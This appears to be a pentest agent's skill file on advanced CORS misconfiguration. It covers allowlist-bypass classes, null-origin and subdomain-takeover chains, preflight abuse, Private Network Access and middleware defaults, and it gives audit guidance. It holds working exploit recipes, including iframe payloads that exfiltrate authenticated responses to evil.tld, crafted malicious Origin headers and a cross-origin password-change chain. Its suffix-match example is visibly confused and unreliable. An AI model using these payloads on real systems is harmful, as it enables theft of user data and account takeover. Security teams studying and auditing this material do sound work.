---
name: cors-misconfiguration-advanced-deep
description: Advanced CORS misconfiguration technique depth — allowlist-bypass class catalog (regex, prefix/suffix, substring, scheme/port, trailing slash), subdomain-takeover-fed allowlists, preflight expansion, Private Network Access depth, framework-middleware default behavior (expressjs/cors, Spring, AWS API Gateway, Nginx, Cloudflare Workers), and chained exploitation.
sibling: cors_misconfiguration
load_when: scan_mode == "deep"
---

# CORS Misconfiguration — Advanced Deep

Load `cors_misconfiguration` for the base-tier framing (attack-surface, three-condition confirmation rule, key-vulnerability class list). Load `cors_misconfiguration_novel_deep` for the 2024–2026 verified middleware-default CVE catalog with version/fix metadata. This file owns the advanced-tier technique depth between them: the allowlist-bypass class catalog, preflight expansion, Private Network Access depth, framework-middleware default behavior (where the CVE's version metadata is in novel but the technique and audit discipline live here), and the chained exploitation surface.

The confirmation discipline is strict (`cors_misconfiguration.md § Confirmation and Validation Discipline`): a server echoing Origin alone is not a finding; a server echoing Origin AND returning `Access-Control-Allow-Credentials: true` AND an authenticated endpoint IS. Every primitive in this file culminates in that three-condition rule. The CVE version metadata for named middleware CVEs is in the novel sibling by filename+section pointer; this file references by CVE number.

## Null Origin Trust at Depth

Primitive: an allowlist contains `null` (or a check that admits `null`); the server emits `Access-Control-Allow-Origin: null` + `Access-Control-Allow-Credentials: true`; attacker-authored content in a `null`-origin context reads the authenticated response.

**Preconditions**:
- Allowlist includes `null` as a trusted value (anti-pattern)
- Response carries `Access-Control-Allow-Credentials: true`
- The user's auth context travels on cross-origin iframe/fetch

**Contexts that produce `Origin: null`**:
- Sandboxed iframe without `allow-same-origin` token (`<iframe sandbox>` or `<iframe sandbox="allow-scripts">`)
- `data:` URL documents
- `blob:` URL documents (under certain navigation shapes)
- Response-redirects across origins where redirect-chain intermediate loses origin
- Local files loaded via `file://` scheme

**Attack recipe** (sandboxed iframe shape):
```html
<!-- https://evil.tld/attack.html -->
<iframe sandbox="allow-scripts" srcdoc="<script>
fetch('https://target.tld/api/account', {credentials: 'include'})
  .then(r => r.text())
  .then(body => fetch('https://evil.tld/log', {method:'POST', body, mode:'no-cors'}));
</script>"></iframe>
```
The sandbox attribute without `allow-same-origin` forces `Origin: null`; the attacker's JS inside the iframe makes the credentialed cross-origin fetch; the server trusts `null`; the response body reaches the attacker's exfil endpoint.

**Confirmation**: the exfil request lands at `https://evil.tld/log` with the authenticated response body. Browser DevTools in the attacker's `evil.tld` tab shows the fetch result from `target.tld` with the body visible.

**Why `null` is dangerous**: unlike `Origin: https://evil.tld` which obviously names the attacker, `Origin: null` is often legitimate in internal testing contexts and may be allowlisted as "allow local development." The common anti-pattern is a developer adding `null` to the allowlist to debug `file://` or sandboxed-iframe testing and leaving it in production.

**Impact**: identical to naive origin reflection — full cross-origin authenticated read.

## Regex Escape and Pattern-Match Bypass Classes

The server-side allowlist is often implemented as a regex, string-method, or pattern-match check. Each implementation has its own bypass class.

**Regex dot-escape failures**:
```python
# Vulnerable: dot not escaped
if re.match(r'^https://.*\.trusted\.tld$', origin):
    allowed = True
```
Attacker Origin `https://evil.tld.a.evil.tld` passes `.*` match and ends in `evil.tld`; the regex expects `*.trusted.tld` but the author forgot escaping. Attack confirmation: send `Origin: https://evilxtrusted.tld` or `https://foo.trusted.tld.evil.tld` and observe reflection.

**Startswith / prefix match**:
```javascript
// Vulnerable: prefix match
if (origin.startsWith('https://trusted.tld')) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}
```
Attacker Origin `https://trusted.tld.evil.tld` passes `startsWith('https://trusted.tld')`. The attack succeeds.

**Endswith / suffix match**:
```python
if origin.endswith('.trusted.tld'):
    allowed = True
```
Attacker Origin `https://evilxtrusted.tld` ends with `.trusted.tld` — wait, that's not how `.trusted.tld` matches `evilxtrusted.tld`; it matches `evil.trusted.tld` which IS a legitimate subdomain. The actual bypass: `https://trusted.tld` without the subdomain prefix fails `.endswith('.trusted.tld')`; but `https://a-trusted.tld.evil.tld` is attacker-controlled and ends with `trusted.tld.evil.tld` — the slash and port handling of the match function matter.

**Substring / includes**:
```javascript
if (origin.includes('trusted.tld')) {
  // ...
}
```
Attacker Origin `https://not-trusted.tld.evil.tld` passes `includes('trusted.tld')`. This is the elysia-cors CVE-2025-50864 class (version metadata at `cors_misconfiguration_novel_deep.md § elysia-cors`).

**Case-sensitivity confusion**:
```python
if origin.lower().endswith('trusted.tld'):
    # Treats cases as equivalent, but...
```
Where the match is case-insensitive but downstream usage is case-sensitive (DNS resolution, SNI, upstream auth), the attacker uses case-shuffled origins to desync the trust check from the actual request routing. The Flask-CORS CVE-2024-6866 (try_match host-regex used for path matching) is the canonical path-side instance of case-insensitive-match-against-case-sensitive-content.

**Trailing-slash normalization**:
```javascript
if (allowed_origins.includes(origin + '/')) {
  // Normalizes attacker origin before compare
}
```
Attacker Origin `https://trusted.tld` becomes `https://trusted.tld/` for the check; if the allowlist stores `https://trusted.tld/` (with slash), the check succeeds. Separately, attacker Origin `https://trusted.tld/.evil.tld` with path separators may normalize unexpectedly across different URL parsers.

**JSON array simple check**:
```javascript
const allowed = ['https://trusted.tld'];
if (allowed.includes(origin)) { /* ... */ }
```
If the check is exact-match, this is correct. Common breakage: the array stores origins with case variation, trailing slashes, or scheme assumptions that don't match the Origin header's canonical form.

### Confirmation Signal for Pattern-Bypass

Each bypass class is confirmed by:
1. Attacker crafts Origin matching the specific pattern-mistake shape
2. Server echoes the attacker Origin into ACAO
3. Server emits ACAC:true
4. Reproduce from a browser; confirm the exfil

## Subdomain-Takeover-Fed Allowlists

Primitive: the allowlist includes a wildcard subdomain or a specific subdomain that is unused and claimable via `subdomain_takeover`. The attacker takes over the subdomain; the subdomain's origin is now a legitimate allowlist match.

**Preconditions**:
- Allowlist pattern: `https://*.trusted.tld` OR specific unused subdomain like `https://old-service.trusted.tld`
- Target subdomain has a dangling DNS record pointing to a claimable third-party service (AWS S3 bucket, Heroku app, GitHub Pages, Azure Front Door, etc.)
- Target application does not re-validate the subdomain's identity (e.g., via a per-request challenge)

**Attack recipe**:
1. Enumerate the target's DNS records; find dangling CNAMEs/A records (route to `subdomain_takeover`)
2. Register the claimable service with the dangling-DNS value
3. Host attacker content on the newly-claimed subdomain
4. The content issues `fetch('https://api.target.tld/account', {credentials: 'include'})`; the request's `Origin` header is `https://claimed.target.tld`; the wildcard allowlist matches
5. Response includes ACAO: https://claimed.target.tld + ACAC: true
6. Response body reaches the attacker's JS

**Confirmation**: subdomain claim verified (`dig` returns the attacker service's IP, HTTP responds with attacker content); the fetch from the subdomain reads the authenticated API; the exfil is captured.

**Impact**: full CORS circumvention via legitimate-looking allowlist match. The attacker's exfil chain is attributable to a `*.target.tld` origin, which may defeat anomaly detectors that trust the subdomain pattern.

## Scheme and Port Confusion

**HTTP-vs-HTTPS allowlist mismatch**:
- Allowlist: `https://trusted.tld`
- Attacker: `http://trusted.tld` (if attacker can MITM or operate a service on HTTP)
- Server match: if the comparison is scheme-insensitive (parsing both URLs and comparing hosts), the attack succeeds

**Port omission**:
- Allowlist: `https://trusted.tld` (implied port 443)
- Attacker: `https://trusted.tld:8443` (non-default port, possibly attacker-controlled on a shared host)
- Server match: implementations vary — some normalize port, some don't. The permissive case grants the attacker a legitimate match.

**Downgrade on redirect**:
- Attacker page lives at `https://evil.tld`; redirects to `http://evil.tld` and makes the credentialed fetch — if the target's allowlist admits `http://evil.tld` (anti-pattern), the exfil succeeds. Modern browsers often block credentialed cross-origin fetches to HTTP from an HTTPS top-level, so verify the browser-side permissibility.

## Trailing-Slash and URL-Normalization Quirks

- Allowlist stored with trailing slash, Origin arrives without — mismatch at string compare, but normalization at URL parse admits both
- Allowlist stored lowercase, Origin arrives with uppercase hostname — case-insensitive DNS semantics vs case-sensitive string compare
- URL-encoded percent sequences in the Origin header — RFC 6454 origin is a tuple; percent-encoded characters in the host should be rejected by RFC 3986 but implementations vary

## Advanced Origin-String Confusion

Primitive: the attacker's `Origin` header is syntactically valid per some parsers but produces a different authority tuple than the application's allowlist expects. The browser's own Origin construction, the server's parsing, and the allowlist's comparator do not agree.

### Three-Slash URL (Scheme-Less)

**Attack recipe**:
```
Origin: https:///evil.tld
```
Some parsers (older Node.js URL parser, pre-WHATWG implementations) construct the authority from the host after `://`. A triple-slash variant (`https:///`) with no authority segment may fall through to an "empty origin" or may be interpreted as `evil.tld`. Combined with an allowlist that uses `startsWith('https://')`, the attacker-crafted `https:///evil.tld` passes the prefix match and the server echoes a syntactically-valid Origin.

Modern browsers normalize `Origin` before emitting; the primitive requires the server-side parsing to be the weak link. Where the server reads the raw header without URL-parsing, the three-slash URL is a passthrough.

### IDN / Punycode / Unicode Origin

**Attack recipe**: register a punycode / IDN domain that visually mimics the allowlist domain.
```
Target allowlist: https://trusted.tld
Attacker domain: https://xn--trusted-7ya.tld   (IDN with homoglyph "trusted")
                 OR https://trսsted.tld        (Armenian ս U+057D looks like Latin u)
```
A substring-match or regex-match that lowercases and compares strings misses the homoglyph; the browser's Origin header carries the punycode form which the server string-matches against the Unicode form, producing a mismatch that may admit or reject depending on normalization order.

**IDN confusion types**:
- Pure-script lookalikes (Latin `o` vs Cyrillic `о` U+043E)
- Mathematical bold / sans-serif Unicode blocks (U+1D400 range)
- Mixed-script attacks (U+200C ZWNJ or U+200D ZWJ between characters)
- Right-to-left override (U+202E RLO) causing visual reversal

### CRLF-in-Origin Injection

**Attack recipe**: `Origin: https://evil.tld\r\nX-Admin: true\r\n`

An HTTP parser that doesn't reject CRLF in header values treats the subsequent lines as additional headers. Where the application reads `Origin` as a trusted value and re-emits it (reflecting into logs, into email templates, into downstream API calls), the CRLF-injected additional headers propagate. Browser-emitted Origin is clean (browsers normalize), so this is a server-to-server-call or log-injection class rather than a browser-mediated attack. Route to `header_injection` for the general CRLF class.

### Null-Byte and Special-Character Terminators

**Attack recipe**: `Origin: https://trusted.tld\x00https://evil.tld`

C-string implementations of HTTP parsers truncate at null byte; the parsed Origin becomes `https://trusted.tld` which matches the allowlist. Where the server later re-emits the full header or forwards it to another component, the un-truncated form admits the attacker's origin. Rare in modern HTTP stacks but observed in C/C++-backed proxies and legacy middleware.

### Backslash and Delimiter Confusion

**Attack recipe**: `Origin: https://trusted.tld\\.evil.tld`

Some URL parsers normalize backslashes to forward slashes (`\\` → `//`); the resulting URL becomes `https://trusted.tld/.evil.tld` with path `.evil.tld`. Allowlist regex `^https://trusted.tld` matches; the authority is still `trusted.tld` from the browser's perspective. The attack is server-side-parsing-specific; verify by testing against the deployment's actual URL-parse behavior.

### Space / Tab in Origin

**Attack recipe**: `Origin:  https://evil.tld` (double space) or `Origin:\thttps://evil.tld` (tab)

Strict parsers reject non-standard whitespace; permissive parsers trim and admit. Where the deployment's parser is permissive and the comparator trims differently, the Origin check may admit a value the normalized comparison would reject.

### URL-Encoded Host

**Attack recipe**: `Origin: https://%65vil.tld` (percent-encoded `e`)

RFC 3986 forbids percent-encoding in host; some parsers decode anyway, some reject, some pass through. Allowlist comparator that compares before decoding admits the encoded form if the allowlist's own entries aren't normalized.

### Attacker-Controlled Subdomain of a Trusted Suffix

**Attack recipe**: for allowlist `endsWith('.target.tld')` or regex `.*\.target\.tld$`, the attacker needs a subdomain of `target.tld` — route to `subdomain_takeover` for the takeover primitive. The CORS consequence is covered in `§ Subdomain-Takeover-Fed Allowlists` above; the origin-string confusion here is the alternate shape where the attacker uses a lookalike domain they own entirely (`https://target-tld.evil.tld` with suffix-matching allowlist that doesn't anchor at word-boundary).

## Preflight Expansion and Allow-Headers Depth

Primitive: a permissive preflight response grants the attacker the right to forward arbitrary headers on the subsequent cross-origin request. The combination of (reflected ACAO) + (ACAC:true) + (permissive Allow-Headers) is the full write-side cross-origin credential primitive.

**Preflight response fields of concern**:
- `Access-Control-Allow-Methods`: lists methods the attacker can use. `*` admits any method; explicit lists are typically narrower
- `Access-Control-Allow-Headers`: lists headers the attacker can forward. `*` admits any header (narrows to non-wildcard-reserved); explicit lists like `Content-Type, Authorization, X-Custom-Header` grant exactly those
- `Access-Control-Allow-Credentials: true`: the preflight-grant travels on the subsequent request
- `Access-Control-Max-Age`: how long the browser caches the preflight; attacker-controlled large values are unusual but possible

**Preflight-echo attack**:
```bash
curl -sIX OPTIONS -H 'Origin: https://evil.tld' \
     -H 'Access-Control-Request-Method: PUT' \
     -H 'Access-Control-Request-Headers: X-Admin-Token, Content-Type' \
     https://target.tld/api/admin
# Vulnerable response:
#   Access-Control-Allow-Origin: https://evil.tld
#   Access-Control-Allow-Methods: PUT, POST, GET, DELETE
#   Access-Control-Allow-Headers: X-Admin-Token, Content-Type
#   Access-Control-Allow-Credentials: true
```
Server echoes the Request-Headers verbatim. Attacker's follow-up PUT with `X-Admin-Token: <stolen>` and crafted body is permitted.

**Interaction with CSRF**: a permissive preflight that admits `Content-Type: application/json` turns CSRF-protected JSON endpoints into cross-origin writes. CORS-relaxed CSRF is a distinct boundary — the state-change invariant belongs to `csrf.md`.

**Preflight caching poisoning**: `Access-Control-Max-Age` sets the browser's cache lifetime for the preflight; a long cache time means a short-lived misconfiguration persists in the user's browser. Not an attack per se but affects the window during which a fixed server configuration still has permissive preflight entries in browsers.

## Private Network Access (PNA) Depth

Primitive: external pages make credentialed requests to internal services at private IPs (`127.0.0.1`, `10.0.0.0/8`, `192.168.0.0/16`, `172.16.0.0/12`); the browser applies additional preflight requirements for the cross-public-to-private boundary; the internal service's PNA headers determine whether the request is permitted.

**Browser mechanism** (per developer.chrome.com):
- Request-side: browser emits `Access-Control-Request-Private-Network: true` on preflights to private-network destinations
- Response-side: the private service must return `Access-Control-Allow-Private-Network: true` for the preflight to succeed

**Enforcement state (as of 2026)**: Chrome's PNA rollout is in flux — the earlier Chrome 123+ warning → enforcement timeline was altered by a 2024 pivot to a permission-prompt model. The current browser-side enforcement is version-dependent and partially gated by permission-prompt origin trials. Treat PNA enforcement as **unverified-current** rather than a fixed 2026 state; verify per deployment.

**Primary attack class**: Flask-CORS CVE-2024-6221 shipped `Access-Control-Allow-Private-Network: true` by default on affected versions (`<4.0.2`); the 4.0.2 fix added the config option (`CORS_ALLOW_PRIVATE_NETWORK`, `allow_private_network` kwarg) but **kept allow_private_network=True as the default** for backwards compatibility. Downstream guidance in this file must not oversell 4.0.2 as secure-by-default; version metadata is at `cors_misconfiguration_novel_deep.md § Flask-CORS Middleware Cluster`.

**Attack recipe**: external attacker page issues `fetch('http://192.168.1.1:8080/admin', {credentials:'include'})`; browser emits PNA preflight; private service responds with `Access-Control-Allow-Private-Network: true`; browser permits the credentialed fetch; attacker reads the admin API from an external page.

**Confirmation**: the external page's fetch returns the private API's response body; verify in the browser DevTools and at the attacker exfil endpoint.

## Framework Middleware Default Catalog

The CVE version metadata is in the novel sibling (`cors_misconfiguration_novel_deep.md`); this file is the technique and audit depth per middleware.

### expressjs/cors (Node)

The `origin: true` and `credentials: true` combination:
```javascript
app.use(cors({ origin: true, credentials: true }));
```
`origin: true` reflects any incoming Origin into ACAO. Combined with `credentials: true` → naive-origin-reflection pattern; every attacker origin is a legitimate match.

Also dangerous: dynamic function callback:
```javascript
app.use(cors({
  origin: (origin, callback) => {
    // Developer intended "allowlist check" but...
    if (origin && origin.includes('trusted.tld')) {
      callback(null, true);
    } else {
      callback(null, false);
    }
  },
  credentials: true
}));
```
The `includes` substring match admits `https://evil-trusted.tld.attacker.tld`; same substring-match class as elysia-cors.

**Audit discipline**: grep for `cors({` and inspect every usage; verify the `origin` option is a static array of exact matches OR a function with strict equality against a known-good list.

### Spring @CrossOrigin and WebMvcConfigurer

```java
@CrossOrigin  // No arguments → defaults to all origins
public class ApiController { ... }
```
Spring 4.3+ docs state verbatim: "By default @CrossOrigin allows all origins and the HTTP methods specified in the @RequestMapping annotation." Spring 6.x/7.0 current docs: "By default, @CrossOrigin allows: All origins, All headers, All HTTP methods ... with maxAge=30 min."

**Credentials default**: `allowCredentials` is NOT enabled by default. Vendor-cited rationale: "that establishes a trust level that exposes sensitive user-specific information (such as cookies and CSRF tokens) and should only be used where appropriate." The default allow-all-origins + credentials-off combination is **not** credentialed-cross-origin-read; it's confidentiality bypass only for non-credentialed endpoints or for endpoints that use non-cookie auth the attacker's JS can set.

**Spring 5.3+ hard-reject**: when `allowCredentials=true` is explicitly set alongside wildcard origins, Spring 5.3+ hard-rejects at startup, forcing the developer to use `allowOriginPatterns` instead. The post-5.3 configuration surface is a different shape.

**Audit discipline**: grep for `@CrossOrigin` and `addCorsMappings`; identify explicit `allowCredentials=true` instances; verify Spring version is 5.3+ to enforce the startup rejection. Property-name drift: `allowedCredentials` in 4.3.x → `allowCredentials` now (cosmetic rename).

### AWS API Gateway (HTTP APIs)

HTTP APIs ship built-in gateway-level CORS as a declarative knob (REST APIs require per-resource OPTIONS + mock-integration or proxy-backend headers). The HTTP API `AllowOrigins` field accepts verbatim:
- `*` — allow all origins
- `https://*` — allow any origin that begins with `https://`
- `http://*` — allow any origin that begins with `http://`

AWS doc verbatim example: `"* (allow all origins) + https://* (allow any origin that begins with https://) + http://* (allow any origin that begins with http://)."`

**Scheme-prefix wildcard danger**: `https://*` admits every HTTPS origin — attacker's `evil.tld` on HTTPS is admitted. Combined with `AllowCredentials: true`, this is naive-origin-reflection equivalent via a legitimate configuration knob.

AWS doc also notes: "API Gateway ignores CORS headers returned from your backend integration" for HTTP APIs — gateway-level CORS is the authoritative config; backend headers do not override.

**Audit discipline**: in the HTTP API's `Cors` configuration, verify `AllowOrigins` is either exact strings or `*` with `AllowCredentials: false`; never `https://*` or `http://*` with `AllowCredentials: true`.

### Nginx add_header $http_origin

```nginx
add_header 'Access-Control-Allow-Origin' $http_origin always;
add_header 'Access-Control-Allow-Credentials' 'true' always;
```
Naive-origin-reflection in config: any Origin is echoed. The `$http_origin` variable is literally the request's Origin header; no allowlist check. Combined with `always` (sends on error responses too), this exposes error-response bodies cross-origin as well.

**Audit discipline**: grep nginx config for `$http_origin`; verify any such use is behind a `map` block or `if` block that implements an actual allowlist, not raw reflection.

### Cloudflare Workers / Edge CORS

Workers often implement CORS at the edge, bypassing the origin's own headers. Common anti-patterns:
```javascript
addEventListener('fetch', event => event.respondWith(handle(event.request)));
async function handle(req) {
  const resp = await fetch(req);
  resp.headers.set('Access-Control-Allow-Origin', req.headers.get('Origin'));
  resp.headers.set('Access-Control-Allow-Credentials', 'true');
  return resp;
}
```
Classic naive-origin-reflection at the edge; the origin's actual CORS configuration is overridden.

**Audit discipline**: inspect Worker code for Origin-echo patterns; verify allowlists are enforced at the Worker level.

### Flask-CORS and Hono and elysia-cors (brief)

CVE-level content for Flask-CORS (×3), Hono, and elysia-cors is at `cors_misconfiguration_novel_deep.md` — the full CVE catalog with version/fix metadata. The audit discipline here: verify the deployed version is at or above the fix line (where that version IS secure-by-default), AND verify no explicit permissive configuration overrides the default-safe behavior.

## Measured — Fetch Standard Confirmation Primitives

The Fetch standard §3.3.5 "CORS protocol and credentials" is the normative source for browser-side enforcement. Measurable primitives:

**Primitive 1 — Wildcard origin + credentials browser-reject**:
```javascript
// Reproducible local test — need a server that returns ACAO: * with ACAC: true
fetch('http://localhost:8080/credentialed', {credentials: 'include'})
  .then(r => r.text())
  .catch(e => console.log('browser-rejected:', e.message));
```
Browsers (Chrome, Firefox, Safari) reject this at the response-handling step; the fetch's `then` is not called; the catch fires with a message like "The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'."

**Primitive 2 — Null origin + credentials browser-permit** (within sandbox):
```html
<iframe sandbox="allow-scripts" srcdoc="<script>
  fetch('http://localhost:8080/credentialed', {credentials: 'include'})
    .then(r => r.text())
    .then(body => console.log('null-origin ok:', body));
</script>"></iframe>
```
If the server returns `ACAO: null` + `ACAC: true`, the fetch succeeds and the body is readable. The sandbox-less `allow-same-origin` is the key — without it, Origin is `null`.

**Primitive 3 — Reflection + credentials happy path**:
```javascript
// From attacker.evil.tld page
fetch('http://localhost:8080/credentialed', {credentials: 'include'})
  .then(r => r.text())
  .then(body => fetch('/exfil', {method:'POST', body}));
```
If the server returns `ACAO: https://attacker.evil.tld` + `ACAC: true`, the response body reaches `then`.

These primitives form the pentester's local-reproduction baseline for distinguishing browser-rejected server misconfiguration (not a finding) from browser-permitted credentialed cross-origin read (a finding).

## Chained Exploitation at Depth

**Chain 1 — Subdomain-takeover → Allowlist feed → Credentialed read**:
- Attacker claims unused `old-service.target.tld` via a dangling DNS record (`subdomain_takeover`)
- Attacker-hosted content at the subdomain issues `fetch(api.target.tld/account, {credentials:'include'})`
- Target's wildcard allowlist `*.target.tld` matches → ACAO: https://old-service.target.tld + ACAC: true
- Response body exfils to attacker endpoint

**Chain 2 — XSS at a trusted-allowlist origin → Same-origin CORS circumvention**:
- Target allowlist includes `https://trusted.target.tld`
- `xss` finding at `https://trusted.target.tld` provides attacker-controlled same-origin JS at the trusted origin
- Attacker's XSS payload issues cross-origin fetch to `api.target.tld`
- Request's Origin is `https://trusted.target.tld` — allowlist match
- Full CORS circumvention via same-origin trust at the trusted-side

**Chain 3 — CORS misconfig + CSRF-permissive preflight → Cross-origin credentialed write**:
- Target's preflight permits `PUT` with `Content-Type: application/json`
- Attacker page issues `fetch(api.target.tld/account/password, {method:'PUT', body:'{"password":"attackervalue"}', credentials:'include', headers:{'Content-Type':'application/json'}})`
- Target accepts the write under the victim's session
- Account takeover via cross-origin password set

**Chain 4 — Flask-CORS unquote_plus desync → Allowlist bypass → Read**:
- Target deploys Flask-CORS <=5.0.1 with per-path allowlist (CVE-2024-6844)
- Attacker crafts a path containing `+` such that `unquote_plus` converts to space
- Flask-CORS matches on the space-decoded path (one path), Flask routes on the raw path (different path)
- CORS allowlist check passes for a path different from the one that handles the request
- Response body is from the real-handled path; CORS headers from the allowlist-matched path

**Chain 5 — PNA default-true + Internal service → External-page read of internal admin**:
- Deployed Flask-CORS <4.0.2 (CVE-2024-6221) on an internal admin service at 192.168.1.100
- Chrome PNA preflight sent from external attacker page
- Flask-CORS emits `Access-Control-Allow-Private-Network: true` by default
- Browser admits the credentialed fetch; external attacker reads the internal admin API

**Chain 6 — expressjs/cors origin:true + socket-io stream → Cross-origin event stream read**:
- Target socket.io endpoint behind expressjs/cors with `origin: true` + `credentials: true`
- Attacker's cross-origin page connects to the WebSocket (or EventSource) with credentials
- WebSocket/EventSource has CORS semantics simpler than XHR; the connection admits the attacker-origin
- Attacker reads server-sent events including user data

## Verification Discipline

- The three-condition confirmation rule (`cors_misconfiguration § Confirmation and Validation Discipline`) applies to every primitive in this file; a finding without all three (reflected Origin, ACAC:true, authenticated endpoint) is not credentialed-cross-origin-read
- For each allowlist-bypass class, reproduce the specific pattern-mistake against the live target; the generic "allowlist has a regex" claim is not the finding — the specific regex-shape that admits the specific attacker origin is
- For subdomain-takeover-fed primitives, both halves must be real: the takeover is a `subdomain_takeover` finding; the CORS consequence is this file's finding
- For PNA findings, verify Chrome's current PNA enforcement state (version-dependent); flag the PNA posture as unverified-current where the browser's rollout timeline affects the attack's reproducibility
- For middleware-default findings, state the deployed middleware version against the CVE catalog; a Flask-CORS 6.0.0 deployment is not exposed to CVE-2024-6844 but may still be exposed to CVE-2024-6221 if `allow_private_network=True` is default
- For wildcard + credentials findings, document as server configuration issue but **do not claim exploitability** absent a non-cookie credential-echo path; the browser-rejection is the gate
- Preserve all exfil artifacts (attacker endpoint logs, response body captures) with timestamps aligned to the victim's session
- Record the exact browser version(s) where reproduction holds; the frontier browsers have different behaviors on edge cases (PNA, null origin, sandbox nuances)

## Summary

Advanced CORS misconfiguration is about where the allowlist breaks under implementation reality — the pattern-match class (regex, prefix, suffix, substring, case-sensitivity, trailing-slash), the subdomain-takeover-fed allowlist, the scheme/port confusion, the preflight-expansion write-side primitive, and the PNA preflight-trust surface. The confirmation discipline is the three-condition rule; the finding is reproduced in the browser with the exfil captured at the attacker endpoint, not in `curl` headers alone. The 2024–2026 CVE catalog of middleware defaults is in `cors_misconfiguration_novel_deep` with version metadata; this file names them by CVE number with filename+section pointers.
